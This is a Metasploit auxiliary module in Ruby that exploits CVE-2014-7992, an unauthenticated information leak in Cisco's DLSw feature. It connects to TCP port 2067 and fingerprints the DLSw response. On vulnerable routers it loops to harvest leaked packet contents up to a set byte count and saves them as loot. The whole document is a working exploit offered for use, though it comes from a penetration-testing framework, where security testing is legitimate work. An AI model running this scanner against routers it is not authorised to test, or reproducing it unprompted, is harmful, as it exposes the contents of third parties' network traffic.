##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'socket'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'           => 'Cisco DLSw Information Leak Scanner',
      'Description'    => %q(
        This module implements the DLSw information leak retrieval. There is
        a bug in Cisco's DLSw implementation affecting 12.x and 15.x trains
        that allows an unuthenticated remote attacker to retrieve the partial
        contents of packets traversing a Cisco router with DLSw configured
        and active.
      ),
      'Author'         => [
        'Tate Hansen', # Vulnerability discovery
        'John McLeod', # Vulnerability discovery
        'Kyle Rainey' # Built lab to recreate vulnerability and help test
      ],
      'References'     =>
        [
          ['CVE', '2014-7992'],
          ['URL', 'https://github.com/tatehansen/dlsw_exploit']
        ],
      'DisclosureDate' => 'Nov 17 2014',
      'License'        => MSF_LICENSE
    )

    register_options(
      [
        Opt::RPORT(2067),
        OptInt.new('LEAK_AMOUNT', [true, 'The number of bytes to store before shutting down.', 1024])
      ], self.class)
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def get_response(size = 8)
    connect
    response = sock.get_once(size)
    disconnect
    response
  end

  # Called when using check
  def check_host(_ip)
    print_status("#{peer}: Checking for DLSw exposure")
    response = get_response

    if response.blank?
      vprint_status("#{peer}: no response")
      Exploit::CheckCode::Safe
    elsif response[0..3] == "\x31\x48\x01\x5b"
      vprint_good("#{peer}: Detected DLSw protocol")
      report_service(
        host: rhost,
        port: rport,
        proto: 'tcp',
        name: 'dlsw'
      )
      # TODO: check that response has something that truly indicates it is vulnerable
      # and not simply that it responded
      print_good("#{peer}: leaked #{response.length} bytes")
      report_vuln(
        host: rhost,
        port: rport,
        name: name,
        refs: references,
        info: "Module #{fullname} collected #{response.length} bytes"
      )
      Exploit::CheckCode::Vulnerable
    else
      vprint_status("#{peer}: #{response.size}-byte response didn't contain any leaked data")
      Exploit::CheckCode::Safe
    end
  end

  # Main method
  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    dlsw_data = ''
    until dlsw_data.length > datastore['LEAK_AMOUNT']
      response = get_response(72)
      dlsw_data << response[18..72] unless response.blank?
    end
    loot_and_report(dlsw_data)
  end

  def loot_and_report(dlsw_leak)
    path = store_loot(
      'dlsw.packet.contents',
      'application/octet-stream',
      rhost,
      dlsw_leak,
      'DLSw_leaked_data',
      'DLSw packet memory leak'
    )
    print_status("#{peer}: DLSw leaked data stored in #{path}")
  end
end
